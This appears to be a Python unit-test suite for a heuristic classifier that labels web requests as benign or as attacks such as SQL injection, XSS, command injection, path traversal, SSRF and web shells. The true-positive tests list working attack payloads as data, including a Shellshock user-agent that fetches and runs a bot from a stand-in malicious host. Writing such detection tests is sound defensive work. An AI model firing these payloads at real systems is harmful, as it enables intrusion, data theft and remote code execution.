"""
test_heuristic_engine.py
========================
Master Comprehensive Unit Test Suite for Heuristic Classification Engine.

Verifies:
1. True Positive detection for all 10 attack classes:
   - SQLi (tautology, union select, blind sleep, error extraction, comment termination)
   - XSS (script tags, event handlers, javascript pseudoprotocol, DOM sinks)
   - Command Injection (chaining, subshells, backticks, direct binaries, shellshock)
   - Path Traversal (directory climbing, encoded traversal, sensitive files, PHP wrappers)
   - SSRF (AWS/GCP metadata, internal loopback probing, non-HTTP protocols)
   - Web Shells (known backdoor files, execution parameters)
   - Directory Fuzzing (hidden VCS, sensitive backup/dumps, admin consoles)
   - Malicious Scanners (sqlmap, nikto, masscan, gobuster, wpscan)
   - Volumetric DDoS HTTP Flood (rate threshold, rate-limiting status under flood)
   - Brute Force (consecutive failed logins exceeding threshold)
2. Zero False Positives on standard enterprise web traffic, natural language queries,
   and concurrent sub-second asset requests.
"""

import sys
import unittest
from pathlib import Path

# Setup workspace import path
WORKSPACE_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(WORKSPACE_ROOT))

from src.pipeline.heuristic_engine import HeuristicLabeler, normalize_request_payload


class TestHeuristicEngineComprehensive(unittest.TestCase):

    def setUp(self):
        self.labeler = HeuristicLabeler(
            brute_force_threshold=5,
            brute_force_window_seconds=300,
            ddos_rate_threshold=25.0
        )

    # -------------------------------------------------------------------------
    # 1. FALSE POSITIVE PREVENTION (Zero False Alarm Verification)
    # -------------------------------------------------------------------------
    def test_benign_query_parameter_keys_not_command_injection(self):
        """Standard query parameters like &id=, &dir=, &cat= must never trigger Command Injection."""
        test_cases = [
            "/products?category=books&id=105",
            "/files?view=grid&dir=asc",
            "/items?page=1&id=42&sort=desc",
            "/search?query=laptop&cat=hardware",
            "/api/v1/users?order=name&dir=ascending",
            "/dashboard?action=view&id=999&dir=ltr&user=guest",
            "/browse?category=tools&cat=screwdrivers&id=10"
        ]
        for url in test_cases:
            label, reason = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "benign", f"False positive on '{url}': Got {label} ({reason})")

    def test_benign_natural_language_not_sqli(self):
        """Natural language queries containing 'and', 'or', 'order' must never trigger SQLi."""
        test_cases = [
            "/search?q=black and white shoes",
            "/legal/terms-and-conditions",
            "/customer/order-history",
            "/store?filter=red or blue",
            "/blog/how-to-order-supplies",
            "/articles/view?title=cats and dogs",
            "/api/products?search=bed or sofa"
        ]
        for url in test_cases:
            label, reason = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "benign", f"False positive on '{url}': Got {label} ({reason})")

    def test_benign_concurrent_subsecond_assets_not_ddos(self):
        """Normal web page assets loading concurrently in the same second (dt=0.0) must remain BENIGN."""
        ip = "192.168.1.50"
        assets = [
            "/index.html",
            "/static/css/main.css",
            "/static/css/bootstrap.min.css",
            "/static/js/bundle.js",
            "/static/img/logo.png",
            "/favicon.ico"
        ]
        labeler = HeuristicLabeler()
        for res in assets:
            label, reason = labeler.classify_single_request(
                resource=res,
                status_code=200,
                client_ip=ip,
                timestamp_epoch=1700000000.0  # Exactly same timestamp (dt = 0.0)
            )
            self.assertEqual(label, "benign", f"False positive DDoS on '{res}': Got {label} ({reason})")

    def test_benign_single_password_typo_not_brute_force(self):
        """A single 401 typo on a login endpoint must not be labeled as Brute Force."""
        labeler = HeuristicLabeler()
        label, reason = labeler.classify_single_request(
            resource="/api/auth/login",
            method="POST",
            status_code=401,
            client_ip="192.168.1.75",
            timestamp_epoch=1700000000.0,
            failed_login_count=1  # Only 1 failed attempt
        )
        self.assertEqual(label, "benign", f"Single 401 marked as brute force: Got {label} ({reason})")

    def test_benign_normal_api_endpoints_not_dir_fuzzing(self):
        """Normal API paths like /api/v1/settings or /user/config must remain BENIGN."""
        test_cases = [
            "/api/v1/settings",
            "/user/profile/settings",
            "/dashboard/configuration",
            "/app/v2/config",
            "/static/docs/api_spec.json",
            "/about/company-settings"
        ]
        for url in test_cases:
            label, reason = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "benign", f"False positive fuzzing on '{url}': Got {label} ({reason})")

    def test_benign_standard_user_agents(self):
        """Legitimate browser and mobile user agents must remain BENIGN."""
        browsers = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
        ]
        for ua in browsers:
            label, _ = self.labeler.classify_single_request(
                resource="/index.html",
                user_agent=ua
            )
            self.assertEqual(label, "benign", f"False scanner alert on UA '{ua}'")

    # -------------------------------------------------------------------------
    # 2. TRUE POSITIVE ATTACK CLASSIFICATIONS
    # -------------------------------------------------------------------------
    def test_true_positive_sqli(self):
        attacks = [
            "/products?id=1' OR '1'='1",
            "/products?id=1' OR '1'='1'",
            "/search?q=test' OR 1=1 --",
            "/items?cat=1 UNION SELECT 1,2,username,password FROM users --",
            "/items?cat=1%20UNION%20DISTINCT%20SELECT%20null,null,version()",
            "/items?cat=1/**/UNION/**/SELECT/**/1,2,3",
            "/login?user=admin' AND SLEEP(5)--",
            "/login?user=admin' AND pg_sleep(3)--",
            "/api/data?id=10; DROP TABLE customers--",
            "/catalog?id=1' AND extractvalue(1,concat(0x7e,version()))--",
            "/users?order=id%20DESC%20--%20"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "sqli", f"Failed to detect SQLi on '{url}'")

    def test_true_positive_xss(self):
        attacks = [
            "/search?q=<script>alert('xss')</script>",
            "/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
            "/profile?bio=<img src=x onerror=alert(document.cookie)>",
            "/view?dest=javascript:alert(1)",
            "/comments?text=<svg/onload=confirm(1)>",
            "/profile?data=<iframe src=\"javascript:alert(1)\">",
            "/redirect?url=data:text/html,<script>alert(1)</script>"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "xss", f"Failed to detect XSS on '{url}'")

    def test_true_positive_command_injection(self):
        attacks = [
            "/network/ping?host=127.0.0.1;whoami",
            "/status?server=127.0.0.1 && cat /etc/passwd",
            "/diagnostics?ip=127.0.0.1|id",
            "/diagnostics?ip=127.0.0.1||whoami",
            "/run?tool=$(whoami)",
            "/run?tool=`id`",
            "/exec?cmd=/bin/bash",
            "/check?host=localhost%0aid"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "command_injection", f"Failed to detect Command Injection on '{url}'")

    def test_true_positive_shellshock_in_user_agent(self):
        ua = "() { :; }; /bin/bash -c 'wget http://malicious.com/bot -O /tmp/bot; chmod +x /tmp/bot; /tmp/bot'"
        label, _ = self.labeler.classify_single_request(
            resource="/index.html",
            user_agent=ua
        )
        self.assertEqual(label, "command_injection")

    def test_true_positive_path_traversal(self):
        attacks = [
            "/download?file=../../../../etc/passwd",
            "/get?file=..%2f..%2f..%2fwin.ini",
            "/view?doc=../../../../windows/system32/drivers/etc/hosts",
            "/index.php?page=php://filter/convert.base64-encode/resource=config.php",
            "/file?path=%2e%2e%2f%2e%2e%2fetc%2fshadow"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "path_traversal", f"Failed to detect Path Traversal on '{url}'")

    def test_true_positive_ssrf(self):
        attacks = [
            "/fetch?url=http://169.254.169.254/latest/meta-data/",
            "/proxy?dest=http://metadata.google.internal/computeMetadata/v1/",
            "/webhook?target=http://127.0.0.1:8080/admin",
            "/import?url=gopher://127.0.0.1:6379/_flushall",
            "/api/fetch?dest=dict://127.0.0.1:11211/stat"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "ssrf", f"Failed to detect SSRF on '{url}'")

    def test_true_positive_web_shell(self):
        attacks = [
            "/uploads/c99.php",
            "/images/wso.php",
            "/shell.jsp?cmd=whoami",
            "/backdoor.php?action=system&query=id",
            "/scripts/eval-stdin.php"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "web_shell", f"Failed to detect Web Shell on '{url}'")

    def test_true_positive_dir_fuzzing(self):
        attacks = [
            "/.env",
            "/.git/config",
            "/.svn/entries",
            "/wp-config.php.bak",
            "/backup.sql",
            "/database.zip",
            "/phpmyadmin/index.php",
            "/server-status",
            "/actuator/health",
            "/swagger.json"
        ]
        for url in attacks:
            label, _ = self.labeler.classify_single_request(resource=url)
            self.assertEqual(label, "dir_fuzzing", f"Failed to detect Dir Fuzzing on '{url}'")

    def test_true_positive_mal_scanner(self):
        scanners = [
            "sqlmap/1.5.2#stable (http://sqlmap.org)",
            "Mozilla/5.0 (compatible; Nikto/2.1.6)",
            "masscan/1.0",
            "gobuster/3.1.0",
            "wpscan v3.8.20",
            "Acunetix Web Vulnerability Scanner",
            "Nessus Vulnerability Scanner"
        ]
        for ua in scanners:
            label, _ = self.labeler.classify_single_request(
                resource="/index.php",
                user_agent=ua
            )
            self.assertEqual(label, "mal_scanner", f"Failed to detect Scanner UA '{ua}'")

    def test_true_positive_ddos_http_flood(self):
        # 1. Direct volumetric velocity parameter >= 25.0 req/s
        label1, _ = self.labeler.classify_single_request(
            resource="/home",
            requests_per_ip_1sec=35.0
        )
        self.assertEqual(label1, "ddos_http_flood")

        # 2. Server status 429 rate limit under high traffic (>= 10 req/s)
        label2, _ = self.labeler.classify_single_request(
            resource="/api/data",
            status_code=429,
            requests_per_ip_1sec=15.0
        )
        self.assertEqual(label2, "ddos_http_flood")

        # 3. Stateful sliding window simulation: 30 requests within 1 second from same IP
        labeler_stateful = HeuristicLabeler(ddos_rate_threshold=25.0)
        client_ip = "10.0.0.99"
        detected_ddos = False
        for i in range(30):
            lbl, _ = labeler_stateful.classify_single_request(
                resource="/index.html",
                client_ip=client_ip,
                timestamp_epoch=1700000000.0 + (i * 0.02)  # 30 reqs within 0.6 seconds
            )
            if lbl == "ddos_http_flood":
                detected_ddos = True
                break
        self.assertTrue(detected_ddos, "Stateful sliding window failed to detect 30 req/s flood!")

    def test_true_positive_brute_force(self):
        # 1. Direct failed login count parameter >= 5
        label1, _ = self.labeler.classify_single_request(
            resource="/login",
            method="POST",
            status_code=401,
            failed_login_count=6
        )
        self.assertEqual(label1, "brute_force")

        # 2. Stateful sliding window simulation: 6 failed logins within 60 seconds
        labeler_stateful = HeuristicLabeler(brute_force_threshold=5, brute_force_window_seconds=300)
        client_ip = "192.168.1.120"
        detected_bf = False
        for i in range(6):
            lbl, _ = labeler_stateful.classify_single_request(
                resource="/api/auth/login",
                method="POST",
                status_code=401,
                client_ip=client_ip,
                timestamp_epoch=1700000000.0 + (i * 10)  # 6 tries every 10 seconds
            )
            if lbl == "brute_force":
                detected_bf = True
                break
        self.assertTrue(detected_bf, "Stateful sliding window failed to detect Brute Force!")


if __name__ == "__main__":
    unittest.main()
